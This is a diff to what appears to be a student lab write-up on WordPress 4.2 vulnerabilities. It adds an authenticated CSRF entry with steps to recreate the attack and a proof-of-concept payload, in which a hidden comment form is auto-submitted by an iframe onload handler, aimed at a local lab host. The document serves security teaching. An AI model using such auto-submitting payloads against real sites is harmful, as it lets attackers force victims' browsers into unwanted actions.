@@ -12,7 +12,7 @@
     - [Link 1]
     
     
-### 1. Authenticated Stored Cross-Site Scripting (XSS)
+### 2. Authenticated Stored Cross-Site Scripting (XSS)
   - [X] Summary: inject java script code as a comment 
     - Vulnerability types:XSS
     - Tested in version: 4.2
@@ -26,13 +26,30 @@
   - [X] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)
     
-### 1. (Required) Vulnerability Name
-  - [ ] Summary: 
-    - Vulnerability types: 
-    - Tested in version: 
-    - Fixed in version:
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+### 3. Authenticated Cross Site Request Forgery
+  - [X] Summary: Create a hidden form that can be submitted by another user when the page loads. Example below leads to infinite loop. Will lead you to page saying "dupilcate comment deleted; it looks as though you've already said that!".
+    - Vulnerability types: CSRF
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.1
+  - [X] GIF Walkthrough: 
+<img src='CSRF Exploit.gif' title='XSS Exploit' width='' alt='' />
+  - [X] Steps to recreate: <br />
+        -create a new comment that includes the javascript code for a new form <br />
+        -below that comment create an iframe that will run the form when it loads <br />
+        -submit comment <br />
+        -refresh page <br /> 
+        
+        Proof of Concept:
+          <form action="http://wpdistillery.vm/wp-comments-post.php" method="post" id="commentform2" class="comment-form" novalidate>
+            <input name="comment" type="hidden" value="hello there">
+            <input type="hidden" name="comment_post_ID" value="3" id="comment_post_ID">
+            <input type="hidden" name="comment_parent" id="comment_parent" value="0">
+            <input type="hidden" id="_wp_unfiltered_html_comment_disabled" name="_wp_unfiltered_html_comment" value="8bfe964cea">
+           </form>
+
+          <iframe src=# onload=document.getElementById('commentform2').submit()> </iframe>
+          
+         
+  - [X] Affected source code:
+    - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)
     
